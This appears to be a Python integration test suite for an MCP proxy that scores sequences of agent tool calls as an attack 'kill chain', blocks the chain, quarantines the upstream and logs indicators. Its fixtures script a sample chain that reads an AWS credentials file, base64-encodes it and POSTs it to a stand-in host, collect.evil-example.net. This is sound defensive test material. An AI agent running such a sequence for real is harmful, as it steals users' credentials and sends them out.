"""Revision-2 integration tests for the kill-chain wiring.

Covers Andrew's six design answers (2026-10-23):

1. Result-side hold at block level (flag-level results still
   deliver) and the persisted score history behind GET
   /_rs/killchain (window boundaries, identity filter, aggregates).
2. Quarantine coupling: sequence blocks flag the neighbor and feed
   quarantine.evaluate exactly like threat-intel blocks.
3. Correlation identity precedence: authenticated agent ID beats
   transport session ID beats client IP + upstream, including
   cross-connection correlation under one agent ID.
4. (Covered by construction/defaults: scorer is core and enabled
   by default; no tier gate exists to test.)
5. Corpus pivots: indicators and external hosts from scored chains
   are registered (call-side and result-side) and persisted as
   JSONL.
6. Dedicated KILL_CHAIN cause code: emitted by the scorer, mapped
   from the kill_chain category, risk-scaled in confidence;
   ATTACK_CHAIN mapping is untouched.

Run: python3 -m pytest mcp_proxy/test_kill_chain_rev2.py -v

Like test_kill_chain_wiring.py, handler tests delete
server.schema_store to bypass the snapshot's known pre-existing
policy-region bug (see that file's docstring).
"""

import json
import os
import tempfile
import threading
import time
import unittest
import urllib.request
from unittest import mock

from mcp_proxy import confidence as confidence_mod
from mcp_proxy import proxy as proxy_mod
from mcp_proxy.config import ProxyConfig
from mcp_proxy.kill_chain_store import ChainHistoryStore
from mcp_proxy.proxy import ProxyServer
from mcp_proxy.sequence_scoring import KillChainScorer

UPSTREAM = "http://upstream.test/mcp"
CLIENT = ("10.0.0.9", 5555)
CLIENT2 = ("10.0.0.77", 5555)
EXTERNAL_URL = "https://collect.evil-example.net/drop"

BASE_ENV = {
    "MCP_PROXY_UPSTREAM": UPSTREAM,
    "MCP_PROXY_PORT": "0",
    "MCP_PROXY_SCREENING": "false",
    "MCP_PROXY_RESULT_SCREENING": "true",
    "MCP_PROXY_BEHAVIOR": "false",
    "MCP_PROXY_POLICY_FILE": "",
    "MCP_PROXY_KILL_CHAIN": "true",
}


class _Forwarder:
    def __init__(self, result=None):
        self.calls = []
        self.result = result or {"result": {"content": []}}

    def __call__(self, url, payload, timeout=30.0):
        self.calls.append(payload)
        return dict(self.result)


def _build_server(env_extra=None, tmpdir=None):
    env = dict(BASE_ENV)
    if tmpdir is not None:
        env["MCP_PROXY_KILL_CHAIN_HISTORY_FILE"] = os.path.join(
            tmpdir, "kill_chain_history.jsonl")
        env["MCP_PROXY_KILL_CHAIN_PIVOTS_FILE"] = os.path.join(
            tmpdir, "kill_chain_pivots.jsonl")
    if env_extra:
        env.update(env_extra)
    with mock.patch.dict(os.environ, env):
        cfg = ProxyConfig()
        server = ProxyServer(cfg)
    return server


def _make_handler(server, client=CLIENT):
    handler = proxy_mod.ProxyHandler.__new__(proxy_mod.ProxyHandler)
    handler.server = server
    handler.client_address = client
    return handler


def _call(handler, server, name, arguments, req_id=1, extra=None):
    req = {"jsonrpc": "2.0", "id": req_id, "method": "tools/call",
           "params": {"name": name, "arguments": arguments}}
    if extra:
        req.update(extra)
    return handler._handle_tools_call(req, req_id, server.cfg,
                                      server.screener)


def _run_chain(handler, server, extra=None, start_id=1):
    """The canonical four-call chain from the wiring tests."""
    calls = [
        ("list_files", {"path": "/data"}),
        ("read_file", {"path": "/home/u/.aws/credentials"}),
        ("base64_encode", {"data": "payload"}),
        ("http_post", {"url": EXTERNAL_URL, "data": "x"}),
    ]
    return [
        _call(handler, server, name, args, start_id + i, extra=extra)
        for i, (name, args) in enumerate(calls)
    ]


def _run_three_stages(handler, server, extra=None, start_id=1):
    """recon + access + staging only (no exfil call)."""
    calls = [
        ("list_files", {"path": "/data"}),
        ("read_file", {"path": "/home/u/.aws/credentials"}),
        ("base64_encode", {"data": "payload"}),
    ]
    return [
        _call(handler, server, name, args, start_id + i, extra=extra)
        for i, (name, args) in enumerate(calls)
    ]


class _HandlerCase(unittest.TestCase):
    """Base: a server on tmp stores, schema region bypassed."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.server = _build_server(tmpdir=self._tmp.name)
        del self.server.schema_store  # see module docstring
        self.addCleanup(self.server.server_close)
        self.handler = _make_handler(self.server)
        self.forwarder = _Forwarder()
        patcher = mock.patch.object(proxy_mod, "_forward_jsonrpc",
                                    self.forwarder)
        patcher.start()
        self.addCleanup(patcher.stop)


class TestIdentityResolution(unittest.TestCase):

    def test_agent_id_beats_session_and_ip(self):
        corr = proxy_mod.resolve_correlation_identity(
            {"_rs_agent_id": "agent-42", "_rs_session_id": "sess-1"},
            CLIENT[0], UPSTREAM)
        self.assertEqual(corr["identity"], "agent-42")
        self.assertEqual(corr["identity_source"], "agent_id")
        self.assertEqual(corr["session_key"], "agent:agent-42")

    def test_session_id_beats_ip(self):
        corr = proxy_mod.resolve_correlation_identity(
            {"_rs_session_id": "sess-1"}, CLIENT[0], UPSTREAM)
        self.assertEqual(corr["identity"], "sess-1")
        self.assertEqual(corr["identity_source"], "session_id")
        self.assertEqual(corr["session_key"], "session:sess-1")

    def test_ip_upstream_fallback_matches_v1_key(self):
        corr = proxy_mod.resolve_correlation_identity(
            {}, CLIENT[0], UPSTREAM)
        self.assertEqual(corr["identity"], CLIENT[0])
        self.assertEqual(corr["identity_source"], "ip_upstream")
        self.assertEqual(corr["session_key"], f"{CLIENT[0]}|{UPSTREAM}")


class TestCorrelationAcrossConnections(_HandlerCase):

    def test_agent_id_correlates_across_client_ips(self):
        extra = {"_rs_agent_id": "agent-42"}
        other = _make_handler(self.server, client=CLIENT2)
        # First three stages from one connection...
        resps = _run_three_stages(self.handler, self.server,
                                  extra=extra)
        for resp in resps:
            self.assertNotIn("error", resp)
        # ...the exfil call arrives from a different connection
        # (different client IP) under the same authenticated agent
        # ID: the chain still completes and blocks.
        r4 = _call(other, self.server, "http_post",
                   {"url": EXTERNAL_URL, "data": "x"}, 4, extra=extra)
        self.assertIn("error", r4)
        self.assertEqual(r4["error"]["data"]["poison_category"],
                         "kill_chain")
        state = self.server.kill_chain.session_state("agent:agent-42")
        self.assertTrue(state["known"])
        # History attributes the chain to the agent identity.
        result = self.server.kill_chain_history.query(
            identity="agent-42", window="24h")
        self.assertEqual(result["count"], 1)
        self.assertEqual(result["sessions"][0]["last_decision"],
                         "block")

    def test_no_agent_id_means_no_cross_ip_correlation(self):
        _run_three_stages(self.handler, self.server)
        other = _make_handler(self.server, client=CLIENT2)
        # Same exfil call, different source IP, no agent ID and no
        # session ID: a fresh (IP, upstream) session sees only a
        # gap observation, which cannot block on its own.
        r4 = _call(other, self.server, "http_post",
                   {"url": EXTERNAL_URL, "data": "x"}, 4)
        self.assertNotIn("error", r4)

    def test_session_id_correlates_across_client_ips(self):
        extra = {"_rs_session_id": "sess-9"}
        _run_three_stages(self.handler, self.server, extra=extra)
        other = _make_handler(self.server, client=CLIENT2)
        r4 = _call(other, self.server, "http_post",
                   {"url": EXTERNAL_URL, "data": "x"}, 4, extra=extra)
        self.assertIn("error", r4)
        self.assertEqual(r4["error"]["data"]["poison_category"],
                         "kill_chain")


class TestResultHoldLevels(_HandlerCase):

    def test_result_flag_still_delivers(self):
        # recon + access only: session at ~45 (flagged).
        _call(self.handler, self.server, "list_files",
              {"path": "/data"}, 1)
        _call(self.handler, self.server, "read_file",
              {"path": "/home/u/.aws/credentials"}, 2)
        self.forwarder.result = {
            "result": {"content": [{
                "type": "text", "text": f"mirror: {EXTERNAL_URL}/x",
            }]},
        }
        resp = _call(self.handler, self.server, "get_status", {}, 3)
        # The result references an external endpoint out of order
        # (exfil as a gap): score ~65, a flag. Sub-block scores
        # flag and deliver: the response is returned unchanged.
        self.assertNotIn("error", resp)
        self.assertIn("result", resp)
        # The flag was still recorded and pivoted on, as a
        # result-side observation.
        result = self.server.kill_chain_history.query(window="24h")
        self.assertEqual(result["count"], 1)
        self.assertEqual(result["sessions"][0]["last_decision"],
                         "flag")
        regs = self.server.kill_chain_pivots.registrations()
        self.assertTrue(any(
            r["source"] == "result"
            and "collect.evil-example.net" in r["indicators"]["hosts"]
            for r in regs))


class TestHistoryRecording(_HandlerCase):

    def test_flag_and_block_events_recorded_with_peak(self):
        _run_chain(self.handler, self.server)
        result = self.server.kill_chain_history.query(
            identity=CLIENT[0], window="24h")
        self.assertEqual(result["count"], 1)
        session = result["sessions"][0]
        # flag (access), flag (staging), block (exfil): 3 events.
        self.assertEqual(session["events"], 3)
        self.assertEqual(session["last_decision"], "block")
        self.assertGreaterEqual(session["peak_score"], 90.0)
        self.assertEqual(session["stages"],
                         ["recon", "access", "staging", "exfil"])
        self.assertEqual(result["max_score"], session["peak_score"])
        self.assertEqual(result["mean_score"], session["peak_score"])
        # Persisted as JSONL, one line per event.
        path = os.path.join(self._tmp.name, "kill_chain_history.jsonl")
        with open(path) as f:
            lines = [json.loads(line) for line in f if line.strip()]
        self.assertEqual(len(lines), 3)
        self.assertEqual(lines[-1]["decision"], "block")


class TestHistoryStoreWindows(unittest.TestCase):

    NOW = 1_800_000_000.0

    def _store(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        store = ChainHistoryStore(os.path.join(tmp.name, "h.jsonl"))
        # (session, identity, age_s, score): one second inside and
        # one second outside each window boundary.
        rows = [
            ("s1", "agent-a", 86399, 50.0),    # inside 24h
            ("s2", "agent-a", 86401, 55.0),    # outside 24h, in 7d
            ("s3", "agent-b", 604799, 60.0),   # inside 7d
            ("s4", "agent-b", 604801, 65.0),   # outside 7d, in 30d
            ("s5", "agent-a", 2591999, 70.0),  # inside 30d
            ("s6", "agent-a", 2592001, 75.0),  # outside 30d
        ]
        for key, ident, age, score in rows:
            store.record(identity=ident, session_key=key,
                         score=score, decision="flag",
                         ts=self.NOW - age)
        return store

    def test_window_boundaries(self):
        store = self._store()
        r24 = store.query(window="24h", now=self.NOW)
        self.assertEqual((r24["count"], r24["max_score"]), (1, 50.0))
        r7 = store.query(window="7d", now=self.NOW)
        self.assertEqual((r7["count"], r7["max_score"]), (3, 60.0))
        r30 = store.query(window="30d", now=self.NOW)
        self.assertEqual((r30["count"], r30["max_score"]), (5, 70.0))
        self.assertEqual(r30["mean_score"], 60.0)

    def test_identity_filter_and_window_echo(self):
        store = self._store()
        res = store.query(identity="agent-b", window="30d",
                          now=self.NOW)
        self.assertEqual(res["count"], 2)
        self.assertEqual(res["identity"], "agent-b")
        res = store.query(window="bogus", now=self.NOW)
        self.assertEqual(res["window"], "24h")  # fell back, echoed

    def test_reload_from_jsonl(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        path = os.path.join(tmp.name, "h.jsonl")
        first = ChainHistoryStore(path)
        first.record(identity="agent-a", session_key="s1",
                     score=42.0, decision="flag", ts=self.NOW)
        second = ChainHistoryStore(path)
        res = second.query(window="24h", now=self.NOW)
        self.assertEqual(res["count"], 1)
        self.assertEqual(res["max_score"], 42.0)


class TestKillchainEndpoint(unittest.TestCase):

    def test_endpoint_shape_auth_posture_and_filters(self):
        with tempfile.TemporaryDirectory() as td:
            server = _build_server(tmpdir=td)
            try:
                now = time.time()
                hist = server.kill_chain_history
                hist.record(identity="agent-http",
                            session_key="agent:agent-http",
                            score=95.0, decision="block",
                            stages=["recon", "access", "staging",
                                    "exfil"], ts=now)
                hist.record(identity="agent-other",
                            session_key="agent:agent-other",
                            score=45.0, decision="flag",
                            stages=["recon", "access"], ts=now - 5)
                thread = threading.Thread(
                    target=server.serve_forever,
                    kwargs={"poll_interval": 0.05}, daemon=True)
                thread.start()
                port = server.server_address[1]
                base = f"http://127.0.0.1:{port}/_rs/killchain"
                # No credentials supplied: the admin surface in
                # this package is unauthenticated, and the endpoint
                # matches that posture (200, like /_rs/behavior).
                with urllib.request.urlopen(base, timeout=5) as resp:
                    self.assertEqual(resp.status, 200)
                    body = json.loads(resp.read())
                self.assertEqual(body["count"], 2)
                self.assertEqual(body["max_score"], 95.0)
                self.assertEqual(body["mean_score"], 70.0)
                self.assertEqual(body["window"], "24h")
                self.assertTrue(body["enabled"])
                top = body["sessions"][0]
                self.assertEqual(top["identity"], "agent-http")
                self.assertEqual(top["stages"],
                                 ["recon", "access", "staging",
                                  "exfil"])
                with urllib.request.urlopen(
                        base + "?identity=agent-other",
                        timeout=5) as resp:
                    body = json.loads(resp.read())
                self.assertEqual(body["count"], 1)
                self.assertEqual(body["sessions"][0]["identity"],
                                 "agent-other")
                with urllib.request.urlopen(
                        base + "?window=30d", timeout=5) as resp:
                    body = json.loads(resp.read())
                self.assertEqual(body["window"], "30d")
            finally:
                server.shutdown()
                server.server_close()


class TestQuarantineCoupling(_HandlerCase):

    def test_sequence_blocks_quarantine_at_threshold(self):
        sequence = [
            ("list_files", {"path": "/data"}),
            ("read_file", {"path": "/home/u/.aws/credentials"}),
            ("base64_encode", {"data": "payload"}),
            ("http_post", {"url": EXTERNAL_URL, "data": "x"}),
        ]
        kc_blocks = 0
        req_id = 0
        for _ in range(4):
            if self.server.quarantine.is_quarantined(UPSTREAM):
                break
            for name, args in sequence:
                req_id += 1
                resp = _call(self.handler, self.server, name, args,
                             req_id)
                data = resp.get("error", {}).get("data", {})
                if data.get("poison_category") == "kill_chain":
                    kc_blocks += 1
        # Three blocks = three neighbor flags = the TI threshold
        # (MCP_PROXY_QUARANTINE_AFTER default 3): the upstream is
        # quarantined and the quarantine hit the reputation graph,
        # exactly as a threat-intel block produces.
        self.assertGreaterEqual(kc_blocks, 3)
        self.assertTrue(self.server.quarantine.is_quarantined(UPSTREAM))
        record = self.server.reputation.get_or_create(UPSTREAM)
        self.assertGreaterEqual(record.event_counts["quarantine"], 1)
        self.assertTrue(any(
            e["action"] == "quarantined"
            for e in self.server.quarantine.events))
        # Fail-closed from here: further calls stop at the gate.
        resp = _call(self.handler, self.server, "list_files",
                     {"path": "/data"}, 999)
        self.assertEqual(resp["error"]["code"],
                         proxy_mod.ERR_SERVER_QUARANTINED)


class TestPivotRegistration(_HandlerCase):

    def test_block_registers_call_indicators(self):
        _run_chain(self.handler, self.server)
        regs = self.server.kill_chain_pivots.registrations()
        self.assertTrue(regs)
        exfil = [r for r in regs if r["source"] == "call"
                 and "collect.evil-example.net"
                 in r["indicators"]["hosts"]]
        self.assertTrue(exfil)
        reg = exfil[-1]
        self.assertIn(EXTERNAL_URL, reg["indicators"]["urls"])
        self.assertEqual(reg["identity"], CLIENT[0])
        self.assertEqual(reg["stages"],
                         ["recon", "access", "staging", "exfil"])
        # Persisted as JSONL beside the history store.
        path = os.path.join(self._tmp.name, "kill_chain_pivots.jsonl")
        with open(path) as f:
            lines = [json.loads(line) for line in f if line.strip()]
        self.assertEqual(len(lines), len(regs))


class TestCauseCode(unittest.TestCase):

    def test_scorer_emits_kill_chain_signal(self):
        scorer = KillChainScorer()
        key = "agent:tester"
        scorer.observe_call(key, "list_files", {"path": "/data"},
                            ts=1000.0)
        scorer.observe_call(key, "read_file",
                            {"path": "/home/u/.aws/credentials"},
                            ts=1010.0)
        scorer.observe_call(key, "base64_encode", {"data": "x"},
                            ts=1020.0)
        result = scorer.observe_call(
            key, "http_post", {"url": EXTERNAL_URL, "data": "x"},
            ts=1030.0)
        self.assertEqual(result["verdict"], "block")
        self.assertEqual(result["signals"][0]["code"], "KILL_CHAIN")

    def test_confidence_mapping_and_scaling(self):
        self.assertEqual(
            confidence_mod.CATEGORY_CAUSE_CODES["kill_chain"],
            ["KILL_CHAIN"])
        # ATTACK_CHAIN stays mapped to its own category.
        self.assertEqual(
            confidence_mod.CATEGORY_CAUSE_CODES["attack_chain"],
            ["ATTACK_CHAIN"])
        self.assertEqual(
            confidence_mod.signals_for_category("kill_chain"),
            [{"code": "KILL_CHAIN", "detail": "", "risk": None}])
        # Risk-scaled: a partial chain scores lower than a
        # completed one; no risk falls back to the table weight.
        low = confidence_mod.score_verdict(
            "BLOCK", [{"code": "KILL_CHAIN", "detail": "d",
                       "risk": 40}])
        self.assertEqual(low["cause_codes"][0]["weight"], 71)
        high = confidence_mod.score_verdict(
            "BLOCK", [{"code": "KILL_CHAIN", "detail": "d",
                       "risk": 95}])
        self.assertEqual(high["cause_codes"][0]["weight"], 92)
        plain = confidence_mod.score_verdict(
            "BLOCK", [{"code": "KILL_CHAIN", "detail": "d"}])
        self.assertEqual(plain["cause_codes"][0]["weight"], 88)


if __name__ == "__main__":
    unittest.main()
